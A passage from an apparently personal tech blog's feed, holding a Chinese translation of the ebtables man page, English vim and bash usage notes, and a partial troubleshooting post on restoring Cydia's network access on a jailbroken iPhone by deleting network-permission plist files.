i（i&gt;0）出插入和在 i-N-1 处插入是一样的。当要一次性插入多条规则时，令 i 严格小于 0 是有好处的。</p><p>-P, --policy</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置chain的默认target，ACCEPT、DROP、RETURN</p><p>-F, --flush</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除非你指定一条chain，否则清除所有chain的规则</p><p>-Z, --zero</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除非你指定一条chain，否则设置所有chain的匹配计数为0，与-L连用时，会先print出已有的匹配计数</p><p>-L, --list</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除非你指定一条chain，否则所有chain的规则都列出来</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Ln 列出所有规则的rule number（即在chain中的序号），与–Lx不兼容</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Lc 在列出规则同时也展示匹配的帧的数量(pcnt)和字节计数(bcnt)，与–Lx配合时可以美化匹配计数的显示</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Lx </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–Lmac2 展示完整的mac地址</p><p>-N, --new-chain</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建一个自定义链，自定义链的最大名字长度为31个字符，默认target是ACCEPT，但可辅助以-P修改</p><p>-X, --delete-chain</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;删除一条没有被引用的用户自定义链，如果没有指定则删除所有没被引用的自定义chain</p><p>-E, --rename-chain</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以重命名自定义链或者内建的链，作用不是很大，如果更改则在提交问题的时候注意写明。</p><p>--init-table</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将当前table的数据用初始数据覆盖</p><p>--atomic-init</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将内核中保存的该table的原始数据保存到一个特定文件中去（相当于最初试的快照）</p><p>--atomic-save</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将内核中保存的该table的目前的数据保存到一个特定文件中去（相当于备份）</p><p>--atomic-commit</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以将一个特定文件中的数据提交到并覆盖内核中的数据</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>使用步骤：</strong></p><ol><li><p>先将使用 –atomic-init 或者 –atomic-save 产生的table数据文件使用<code>--atomic-file</code> 加载到当前的防火墙table</p></li><li><p>加载文件至防火墙table（此时还没刷新内核中的数据呢）还有另一途径就是：设置<em>EBTABLES_ATOMIC_FILE</em> 环境变量</p></li><li><p>使用<code>--atomic-commit</code> 提交并修改内核中的数据</p></li><li><p>在操作系统起始的 boot script 中十分有用，用来构建快速 ebtables</p></li></ol><br><p>-V, --version</p><p>-h, --help [list of module names]</p><p>-j, --jump <em>target</em></p><p>--atomic-file <em>file</em></p><p>-M, --modprobe <em>program</em> : 与内核交互时，使用 <em>program</em> 尝试自动加载某个缺失的内核模块</p><p>--concurrent : 设置一个锁防止脚本们并发地修改内核中维护的 ebtables 表</p><br><h3 id="规则说明"><a href="#规则说明" class="headerlink" title="规则说明"></a>规则说明</h3><p>-p, --protocol [!] <em>protocol</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创造出一个帧所使用的协议，可以是一个大于 0x0600 的16进制数 或<strong>长度</strong>。以太网帧的协议域可以用来指示头部的长度。当该域的值小于或等于 0x0600时，那么该值就等于帧头的大小并且不能被用作协议号。相反，所有协议域被用作长度域时的帧通常会被认为使用了“和那个长度对应”的协议。这些协议在这些帧中的名字就是长度(值) [<strong>LENGTH</strong>)，<code>/etc/ethertypes</code> 文件以人类可读的方式展示了协议及其的十六进制数字，和英文缩写。比如，<em>0x0800</em> 就表示IPV4协议。这个文件不是大小写敏感的，–proto 可以用来替换 -p</p><p>-i, --in-interface [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;帧进来的接口(bridge port)，这个选项在 INPUT,FORWARD,PREROUTING,BROUTING链中有用。如果接口名字以’+’结尾，那么所有以该名字开头的接口都会被匹配，可以用 <code>--in-if</code>  替代</p><p>--logical-in [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;帧进来的逻辑接口(如 eth0.1 这样的？)，生效于👆所提及的四条链，且+也同上。</p><p>-o, --out-interface [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;帧要往哪个接口发出(bridge port)，这个选项在 OUTPUT,FORWARD,POSTROUTING链中有用。如果接口名字以’+’结尾，那么所有以该名字开头的接口都会被匹配，可以用 <code>--out-if</code>  替代</p><p>--logical-out [!] <em>name</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定义帧要出去的逻辑接口(如 eth0.2 这样的？)，生效于👆所提及的四条链，且+也同上。</p><p>-s, --source [!] <em>address[/mask]</em></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;源MAC地址，掩码与地址都用6个被冒号分隔的十六进制表示。你可以手动指定如下这些：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unicast = 00:00:00:00:00:00/01:00:00:00:00:00</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>Multicast</em>=01:00:00:00:00:00/01:00:00:00:00:00</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>Broadcast</em>=ff:ff:ff:ff:ff:ff/ff:ff:ff:ff:ff:ff</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<em>BGA</em>=01:80:c2:00:00:00/ff:ff:ff:ff:ff:ff</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：广播地址的帧也会和多播地址规则匹配，可以用 –src 来替代这个命令</p><p>-d, --destination [!] <em>address</em>[/mask]</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The destination MAC address. See -s (above) for more details on MAC addresses. The flag –dst is an alias for this option.</p><p>-c, --set-counter <em>pcnt bcnt</em></p><br><h3 id="扩展选项-EXTENSIONS"><a href="#扩展选项-EXTENSIONS" class="headerlink" title="扩展选项 EXTENSIONS"></a>扩展选项 EXTENSIONS</h3><p>注：无需向 iptables 那样使用 -m 来加载，ebtables 的内部实现里会自动加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">未翻译部分：;;原因：本论文可能用不到</span><br><span class="line"></span><br><span class="line">802_3：</span><br><span class="line"></span><br><span class="line">Specify 802.3 DSAP/SSAP fields or SNAP type. The protocol must be specified as LENGTH (see the option -p above).</span><br><span class="line">--802_3-sap [!] sap</span><br><span class="line">DSAP and SSAP are two one byte 802.3 fields. The bytes are always equal, so only one byte (hexadecimal) is needed as an argument.</span><br><span class="line">--802_3-type [!] type</span><br><span class="line">If the 802.3 DSAP and SSAP values are 0xaa then the SNAP type field must be consulted to determine the payload protocol. This is a two byte (hexadecimal) argument. Only 802.3 frames with DSAP/SSAP 0xaa are checked for type.</span><br><span class="line"></span><br><span class="line">ip6 - 未翻译</span><br><span class="line">stp - 未翻译</span><br></pre></td></tr></table></figure><p><br><strong>among</strong></p><p>将MAC地址或MAC/IP地址对和某个MAC地址列表（MAC/IP地址对列表）做匹配。</p><p>MAC地址或MAC/IP地址对 如：xx:xx:xx:xx:xx:xx[=yy.yy.yy.yy][,]</p><p>在该列表中出现同一MAC不同IP的时也是会正常做匹配的</p><p>--among-dst [!] <em>list</em> 对比MAC目的地址</p><p>--among-src [!] <em>list</em> 对比MAC源地址</p><p>--among-dts-file [!] <em>file</em> 以文件的方式做列表</p><p>--among-src-file [!] <em>file</em></p><br><p><strong>arp</strong></p><p>指定 (R)ARP 类型的包，前提是协议必须设置为 ARP 或 RARP</p><p>--arp-opcode [!] <em>opcode</em>   (R)ARP 的操作码（十六进制或字符串，查看帮助 <strong>ebtables -h arp</strong>）</p><p>--arp-htype [!] <em>hardware type</em>   硬件类型，可以是十六进制或字符串 “<em>Ethernet</em>“ (它的类型是1)。大多数的 (R)ARP 包都是以 <em>Ethernet</em> 作为硬件类型</p><p>--arp-ptype [!] <em>protocol type</em>   (R)ARP 所使用的协议类型，为十六进制或字符串 “<em>IPv4</em>“ (其表示为 <strong>0x0800</strong> )。大多数(R)ARP包都是 IPv4</p><p>--arp-ip-src [!] <em>address[/mask]</em>   指定 (R)ARP 的源IP地址</p><p>--arp-ip-des [!]  <em>address[/mask]</em>   目的IP地址</p><p>--arp-mac-des [!]  <em>address[/mask]</em>   目的MAC地址</p><p>--arp-mac-src [!]  <em>address[/mask]</em>   源MAC地址</p><p>[!] --arp-gratuitous   Checks for ARP gratuitous packets: checks equality of IPv4 source address and IPv4 destination address inside the ARP header</p><br><p><strong>ip</strong></p><p>指定 IPv4 类型的包，协议必须为 IPv4</p><p>--ip-source [!] <em>address[/mask]</em>   =====&gt; <em>–ip-src</em>   源IP地址</p><p>--ip-destination [!] <em>address[/mask]</em>   =====&gt; <em>–ip-dst</em>   目的IP地址</p><p>--ip-tos [!] <em>tos</em>    (type of service) =====&gt; 十六进制数 或 <strong>IPv4</strong></p><p>--ip-protocol [!] <em>protocol</em>   =====&gt; <em>–ip-proto</em>   指明协议</p><p>--ip-source-port [!] <em>prot1[:port2]</em>   =====&gt; <em>–ip-src</em>   源端口或端口范围：6(TCP) , 17(UDP) , 33(DCCP) , 132(SCTP) ，必须设定<code>--ip-protocol</code> 字段为对应协议；如果 <em>port1</em> 被省略了，那么代表0:port2；如果<em>port2</em> 被省略了，代表port1:65535；=====&gt; <em>–ip-sport</em></p><p>--ip-destination-port [!] <em>prot1[:port2]</em>  同上 =====&gt; <em>–ip-dport</em></p><br><p><strong>limit</strong></p><br><p><strong>vlan</strong></p><p>指定 802.1Q 标签控制信息（Tag Control Information） 字段。协议必须指定为 802_1Q(0x8100)</p><p>--vlan-id [!] <em>id</em>    指定 VLAN 的标识符 (identifier filed, VID)，十进制数 0-4095</p><p>--vlan-prio [!] <em>prio</em>   用户优先级域，十进制 0-7，VID 必须设置为 0 （“null VID”）或者不指定。</p><p>--vlan-encap [!] <em>type</em>   被封装后的以太网帧的长度（也就是类型），为从0x0000 到 0xFFFF的十六进制数，或者在<code>/etc/ethertypes</code> 文件中的字符串</p><br><h3 id="观察者扩展-WATCHER-EXTENSIONS"><a href="#观察者扩展-WATCHER-EXTENSIONS" class="headerlink" title="观察者扩展 WATCHER EXTENSIONS"></a>观察者扩展 WATCHER EXTENSIONS</h3><p>只向日志文件中记录通过的帧，不能进行操作</p><p><strong>log</strong></p><p>log 观察者只向 syslog 写入帧的描述性数据</p><p>--log 默认选项，采用<code>log-level=info,log-prefix=&quot;&quot;</code>设置，且不记录ip，不记录arp</p><p>--log-level <em>level</em>   设置日志（记录）等级，参考<strong>ebtables -h log</strong> ，默认为 <em>info</em></p><p>--log-prefix <em>text</em>   记录条目的前缀，方便查看记录文件的时候快速识别出哪些来自 ebtables</p><p>--log-ip   当带有ip协议的帧匹配到规则时会记录ip</p><p>--log-ip6</p><p>--log-arp   当带有 (r)arp 协议的帧匹配到规则的时候，记录arp信息</p><br><p><strong>nflog</strong></p><p>nflog 观察者会传递匹配的包给一个后台运行的进程（loaded loggin backend）来记录数据包。通常这个后端程序为 <code>nfnetlink_log</code> , 这个后端程序会通过 <em>netlink</em> 套接字（socket）向多播组内多播接受到底数据包（帧）。而且一个或多个用户空间的进程可以加入该多播组从而收到这些包。</p><br><p>--nflog    用默认设置记录</p><p>--nflog-group <em>nlgroup</em>   数据包所属的 netlink 组(1 - 2^32-1)(仅适用于nfnetlink_log)。默认为1</p><p>--nflog-prefix <em>prefix</em>   记录日志的前缀，同上文，最长30个字符</p><p>--nflog-range <em>size</em>   规定多少字节被拷贝到用户空间（只对nfnetlink_log有效），且一般 nfnetlink_log 实例会指定自己的范围，这个选项会覆盖那个选项。</p><p>--nflog-threshold <em>size</em>    发送到用户空间之前要在内核中排队的包的数量 (仅适用于nfnetlink_log)。值越大，每个包的开销就越少，但是会增加延迟，直到包到达用户空间。默认值是1。</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulog - 未翻译</span><br></pre></td></tr></table></figure><br><h3 id="目标扩展-TARGET-EXTENSIONS"><a href="#目标扩展-TARGET-EXTENSIONS" class="headerlink" title="目标扩展 TARGET EXTENSIONS"></a>目标扩展 TARGET EXTENSIONS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpreply - 未翻译</span><br><span class="line">mark - 未翻译</span><br></pre></td></tr></table></figure><br><p><strong>dnat</strong></p><p>该动作(target)只能用在 BROUTING 链，和 nat 表的 PREROUTING、OUTPUT链。指定了目的MAC地址必须要被改变</p><p>--to-destination <em>address</em>   =====&gt; <strong>–to-dst</strong></p><p>--dnat-target <em>target</em>   指定了标准动作（target）。因为在 dnat 后 ebtables 还需要知道怎么处理一个被 dnated 的帧，默认是 <strong>ACCEPT</strong>， 将其设置为 <strong>CONTINUE</strong> 可以让你在同一个帧上使用多个动作扩展（multiple target extensions)。设置为 <strong>DROP</strong> 只在 BROUTING 链中有用，当然此时还不如用 redirect 更合理呢。还可以设置为 <strong>RETURN</strong> ，注意在 基础链（base chain，应该指的是最开头的链，因为内核不知道还往哪里返回了！）中使用 RETURN 是不允许的。</p><br><p><strong>redirect</strong></p><p>重定向目标（target，或译为动作）将把MAC目标地址更改为帧到达的桥接设备的目标地址。此 target 只能在broute表的BROUTING链和nat表的PREROUTING链中使用。在BROUTING链中，使用桥端口的MAC地址作为目标地址，在PREROUTING链中使用桥的MAC地址。</p><p>--redirect-target <em>target</em>   指定标准target。在MAC重定向之后，规则仍然必须给出一个标准目标，以便ebtables知道该做什么。默认目标是ACCEPT。而使用 CONTINUE 可以让您在同一帧上使用多个目标扩展。在BROUTING 链上使用 DROP 会让帧被路由。也允许使用 RETURN。注意，不允许在基链中使用RETURN。</p><br><p><strong>snat</strong></p><p>这个动作只能被用在 nat 表的 POSTROUTING 链，它指定源MAC地址必须被改变</p><p>--to-source <em>address</em>    =====&gt; <strong>–to-src</strong></p><p>--snat-target <em>target</em>    指定一个标准动作，除了不能使用 DROP 之外，其余与上文一样</p><p>--snat-arp    如果包是arp消息，并且arp头中的硬件地址长度为6字节，那么还需要更改arp头中的硬件源地址。</p><br>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以下内容翻译自 ebtables 的 Man 页&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iptables</title>
    <link href="https://pwn4justice.github.io/2019/04/30/iptables/"/>
    <id>https://pwn4justice.github.io/2019/04/30/iptables/</id>
    <published>2019-04-29T16:02:46.000Z</published>
    <updated>2019-07-06T08:09:49.425Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址：<code>http://www.zsythink.net/archives/tag/iptables/page/2/</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文地址：&lt;code&gt;http://www.zsythink.net/archives/tag/iptables/page/2/&lt;/code&gt;&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Shell Usage</title>
    <link href="https://pwn4justice.github.io/2019/04/22/Shell-Usage/"/>
    <id>https://pwn4justice.github.io/2019/04/22/Shell-Usage/</id>
    <published>2019-04-22T14:26:41.000Z</published>
    <updated>2019-07-06T08:15:44.748Z</updated>
    
    <content type="html"><![CDATA[<p>关于如何使用shell以及vim的笔记，用于常常翻看</p><a id="more"></a><h2 id="0x01-How-to-use-‘vim’"><a href="#0x01-How-to-use-‘vim’" class="headerlink" title="0x01 How to use ‘vim’"></a>0x01 How to use ‘vim’</h2><h3 id="1-Edit-Mode"><a href="#1-Edit-Mode" class="headerlink" title="1. Edit Mode"></a>1. Edit Mode</h3><ul><li>using ‘a’ ‘A’ ‘o’ ‘O’ ‘i’ ‘I’ ‘r’ ‘R’ to enable this mode</li></ul><h3 id="2-Command-Mode"><a href="#2-Command-Mode" class="headerlink" title="2. Command Mode"></a>2. Command Mode</h3><ul><li>‘:’ ‘/‘ ‘?’ </li></ul><h3 id="3-Using-‘wq-’-to-save-file-compulsively"><a href="#3-Using-‘wq-’-to-save-file-compulsively" class="headerlink" title="3. Using ‘wq!’ to save file compulsively"></a>3. Using ‘wq!’ to save file compulsively</h3><h3 id="4-Some-commen-fast-key-in-daily-life"><a href="#4-Some-commen-fast-key-in-daily-life" class="headerlink" title="4. Some commen fast-key in daily life"></a>4. Some commen fast-key in daily life</h3><ol><li><code>ctrl + f</code> : move to next page(screen)</li><li><code>ctrl + b</code> : move to previous page(screen)</li><li><code>ctrl + d</code> : move to next half page</li><li><code>ctrl + u</code> : </li><li><code>+</code> : next line <code>-</code> : previous line</li><li><code>num&lt;space&gt;</code> : to ‘num’- th character of THIS line</li><li><code>0</code> : to the head of THIS line</li><li><code>$</code> : to the tail of THIS line</li><li><code>H</code> or <code>M</code> or <code>L</code> : to the head of this screen ; to the middle of this screen ; to the lowest of this screen</li><li><code>nG</code> : to the ‘n’ line of this FILE</li><li><code>N&lt;enter&gt;</code> : move down N lines of  the mouse</li><li><code>?keyword:</code>  :  find the word ‘keyword’ upward from THERE</li><li><code>:n1,n2s/old/new/g</code>  : find and replace between line ‘n1’ and line ‘n2’</li><li><code>:1,$s/old/new/g</code>  : find and replace from 1st line to the last one</li><li>``:1,$s/old/new/gc`  : find and replace from 1st line to the last one and every one needs to CONFIRM</li><li><code>nx</code> or <code>nX</code>  : delete n character</li><li><code>d1G</code> : delete TO 1st line from THERE</li><li><code>dG</code> : delete TO final line from THERE</li><li><code>d$</code> : delete TO the tail of THIS line</li><li><code>d0</code> : delete TO the head of THIS line</li><li><code>nyy</code> : copy n line</li><li><code>y1G</code></li><li><code>yG</code></li><li><code>y$</code></li><li><code>y0</code></li><li><code>J</code> : combine THIS line and NEXT line</li><li><code>Ctrl + r</code> or <code>.</code> : repeat the action again</li><li><code>:w filename</code> : save file to a newfile</li><li><code>:r filename</code> : copy the content of ‘filename’ next to where the curse is</li><li><code>:n1,n2 w filename</code> : save content of line n1 TO n2 to a newfile</li><li><code>:! commnad</code> : runing shell command in vim</li><li><code>:set nonu</code> : CANCEL showing line number</li></ol><h3 id="5-About-Unusual-Quit-of-vim"><a href="#5-About-Unusual-Quit-of-vim" class="headerlink" title="5. About Unusual Quit of vim"></a>5. About Unusual Quit of vim</h3><ul><li>You should delete file <code>.file.swp</code> manually after Recover From this file!</li></ul><h2 id="0x02-Frequently-used-commands"><a href="#0x02-Frequently-used-commands" class="headerlink" title="0x02 Frequently used commands"></a>0x02 Frequently used commands</h2><h3 id="1-alias"><a href="#1-alias" class="headerlink" title="1. alias"></a>1. alias</h3><h3 id="2-Visual-Block"><a href="#2-Visual-Block" class="headerlink" title="2. Visual Block"></a>2. Visual Block</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1    host1.class.net</span><br><span class="line">192.168.1.2    host2.class.net</span><br><span class="line">192.168.1.3    host3.class.net</span><br><span class="line">192.168.1.4    host4.class.net</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Important Keys:</p><p><code>v</code>  choose characters</p><p><code>V</code>  choose lines</p><p><code>ctrl + v</code> choose rectangle area</p><p><code>y</code>  copy</p><p><code>d</code>  delete</p><p><strong>For instance : Try to copy ‘ hostn  ‘ to the area behine ‘ .net ‘  like this</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1    host1.class.nethost1</span><br><span class="line">192.168.1.2    host2.class.nethost2</span><br><span class="line">192.168.1.3    host3.class.nethost3</span><br><span class="line">192.168.1.4    host4.class.nethost4</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>You can follow the steps:</p><ol><li>move curse to ‘h’ of ‘host1’</li><li>Press <code>ctrl v</code></li><li>move curse to 4 of ‘host4’</li><li>press <code>y</code></li><li>and move curse to the 1st line’s tail</li><li>press <code>p</code></li></ol><h3 id="3-Multi-files-editing"><a href="#3-Multi-files-editing" class="headerlink" title="3. Multi files editing"></a>3. Multi files editing</h3><ol><li>using <code>vim file1 file2</code> to open two files</li><li><code>:n</code> to edit the next file and <code>:N</code> to edit the previous one</li><li><code>:files</code> to see how many files you have opened</li><li>BTW: you can use <code>yy</code> and <code>p</code> between those 2 files!</li></ol><h3 id="4-Using-multi-windows-of-vim"><a href="#4-Using-multi-windows-of-vim" class="headerlink" title="4. Using multi windows of vim"></a>4. Using multi windows of vim</h3><ol><li>open a file</li><li>using <code>:sp</code> to split a window for itself</li><li>using <code>:sp file2</code> to put file2 underneath file1</li><li>Move curse between two windows:<ol><li>ctrl w j : move down</li><li>ctrl w k : move up</li><li>ctrl w q : quit an window</li></ol></li></ol><h3 id="5-Configuration-file-of-vim"><a href="#5-Configuration-file-of-vim" class="headerlink" title="5. Configuration file of vim"></a>5. Configuration file of vim</h3><ol><li><code>.vimrc</code> : default settings</li><li><code>.viminfo</code>: operation history</li><li>changing settings of vim:<ol><li>using <code>:set xxx</code> directly in vim to temporarily changing the settings</li><li>edit ‘.vimrc’ file to modify default settings</li><li>some examples:</li></ol></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:set nu/nonu</span><br><span class="line">:set hlsearch/nohlsearch</span><br><span class="line">:set backup</span><br><span class="line">:set showmode;;aka showing &apos;--INSERT--&apos; or &apos;--REPLACE--&apos;</span><br><span class="line">:set backspace=0/1/2</span><br><span class="line">:set all</span><br><span class="line">:syntax on/off</span><br><span class="line">:set bg=dark/light</span><br><span class="line">:set autoindent</span><br></pre></td></tr></table></figure><h3 id="6-About-encoding-problem"><a href="#6-About-encoding-problem" class="headerlink" title="6. About encoding problem"></a>6. About encoding problem</h3><ul><li><p>reference : <code>iconv</code> command</p></li><li><p>for instance:</p><ul><li>file1(encoding: <strong>big5</strong>) -&gt; file1.utf8(encoding: <strong>utf8</strong>) , you can do this:</li><li><code>iconv -f big5 -t utf8 file1 -o file1.utf8</code></li></ul></li></ul><h2 id="0x03-Something-about-Shell"><a href="#0x03-Something-about-Shell" class="headerlink" title="0x03 Something about Shell"></a>0x03 Something about Shell</h2><h3 id="1-builtin-commands"><a href="#1-builtin-commands" class="headerlink" title="1. builtin commands:"></a>1. builtin commands:</h3><ol><li><code>type</code> : <code>type ls</code> may be == <code>which ls</code></li><li><code>cd</code></li></ol><h3 id="2-some-truth-of-variables"><a href="#2-some-truth-of-variables" class="headerlink" title="2. some truth of variables"></a>2. some truth of variables</h3><ol><li>“this is $var” <strong>not equals to</strong>  ‘this is $var’</li><li>`command` <strong>is equal to</strong> <code>$(command)</code></li><li><code>export</code> can create a <strong>global variable</strong></li><li>the funny use of `command` : <code>cd /lib/modules/$(uname -r)/kernel</code></li><li>you can define a work directory which name is very long to a <strong>variable</strong>: <code>[root@~ ]$ work=/a/b/c/d/e/</code>  and <code>cd $work</code></li><li>using <code>env</code> to show <strong>global variables</strong></li><li>using <code>set</code> to show <strong>all variables</strong></li><li>actually, <strong>PS1=’[\u@\h \W]$‘</strong> and <strong>PS2=’&gt; ‘</strong><ol><li><code>\h</code> : host</li><li><code>\d</code> : like “Mon Feb 2”</li><li><code>\H</code> : whole hostname</li><li><code>\t</code> : 24hours</li><li><code>\T</code> : 12hours</li><li><code>\u</code> : username</li><li><code>\v</code> : version of Bash</li><li><code>\W</code> : whole name of directory, form ‘/‘</li><li><code>\w</code>: dir name</li><li><code>\$</code> : root:<strong>#</strong> and other:<strong>$</strong></li></ol></li><li>system language setting: <code>/etc/sysconfig/i18n</code></li><li><code>read</code> : get INPUT from user: <code>read -p &quot;Input Here: &quot;  var_name</code> or <code>read -p &quot;Input name: &quot; -t 20 name</code> then <code>echo $name</code></li><li><code>declare</code><ol><li>-a : declare an array</li><li>-x : declare a global variable</li><li>-i : declare an int value</li><li>-r : declare a readonly variable</li><li><code>declare -i sum=10+10+10</code> ==&gt; 30</li><li><code>declare -x sum</code> change <strong>sum</strong> to global; <code>declare +x sum</code> change <strong>sum</strong> to normal variable</li><li>using <code>declare -p var</code> to see var’s type</li></ol></li></ol><h3 id="3-some-wired-commands-I-dont-need-them-for-now"><a href="#3-some-wired-commands-I-dont-need-them-for-now" class="headerlink" title="3. some wired commands , I dont need them , for now."></a>3. some wired commands , I dont need them , for now.</h3><ol><li><code>ulimit</code></li><li><code>dd</code></li><li><code>unalias</code></li></ol><h3 id="4-modify-the-content-of-variable"><a href="#4-modify-the-content-of-variable" class="headerlink" title="4. modify the content of variable"></a>4. modify the content of variable</h3><ol><li>${path#/*root/bin:}  =&gt; from <code>path</code> delete the SHORTEST  <code>/.....root/bin;</code> </li><li>${path##/*:} ==&gt; from <code>path</code> delete the LONGEST <code>/......;</code></li><li><code>%</code> and <code>%%</code> is just the same as <code>#</code> and <code>##</code> , however, # starts from head but % starts from tail</li><li>${path/old/new} ==&gt; for <strong>replace once</strong>  </li><li>${path//old/new} ==&gt; for <strong>replace all</strong>  </li><li>new_var=${old_var-content}, if old_var is null then new_var equals = content else new_var = old_var</li><li><code>-</code> <code>:-</code>   if old_var is nul or old_var=””  then new_var equals = content else new_var = old_var</li><li><code>+</code>  <code>:+</code></li><li><code>=</code> <code>:=</code></li><li><code>?</code> <code>:?</code></li><li>In Shell:<ol><li>!!                         :reapeat the last command</li><li>!command       : search command in history</li><li>!number           :execute the number-th command in history</li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于如何使用shell以及vim的笔记，用于常常翻看&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Cydia 无法连接网络的处理</title>
    <link href="https://pwn4justice.github.io/2019/04/07/Cydia-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%BD%91%E7%BB%9C%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>https://pwn4justice.github.io/2019/04/07/Cydia-无法连接网络的处理/</id>
    <published>2019-04-07T13:16:03.000Z</published>
    <updated>2019-07-06T12:30:21.157Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍了当 iPhone 越狱后 Cydia 无法加载网络的解决办法</p><a id="more"></a><h3 id="iPhone-越狱后-Cydia-商店无法加载网络"><a href="#iPhone-越狱后-Cydia-商店无法加载网络" class="headerlink" title="iPhone 越狱后 Cydia 商店无法加载网络"></a>iPhone 越狱后 Cydia 商店无法加载网络</h3><h4 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境:"></a>0x01 环境:</h4><ul><li>iPhone SE</li><li>OS: 11.4</li><li>Jailbreak Tools: unc0ver</li></ul><h4 id="0x02-原因分析"><a href="#0x02-原因分析" class="headerlink" title="0x02 原因分析:"></a>0x02 原因分析:</h4><p>国行手机比美版、港版、韩版手机新增了网络授权的功能，iOS 10 及以上系统版本，任何应用首次打开，如果有请求网络的行为，都会提示网络请求授权的对话框。首次打开 Cydia 并没有提示网络请求授权的对话框，这就是导致国行手机 Cydia 不能上网的原因。</p><h4 id="0x03-解决办法"><a href="#0x03-解决办法" class="headerlink" title="0x03 解决办法:"></a>0x03 解决办法:</h4><p>由于允许上网的应用列表信息保存在以下这几个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/preferences/com.apple.networkextension.plist</span><br><span class="line">/var/preferences/com.apple.networkextension.cache.plist</span><br><span class="line">/var/preferences/com.apple.networkextension.necp.plist</span><br></pre></td></tr></table></figure><p>只要删除这些文件就不会有网络请求授权的问题。</p><h4 id="0x04-具体步骤"><a href="#0x04-具体步骤" class="headerlink" title="0x04 具体步骤:"></a>0x04 具体步骤:</h4><ol><li><p>在iPhone上打开科学上网功能，此时可以临时让 <code>Cydia</code> 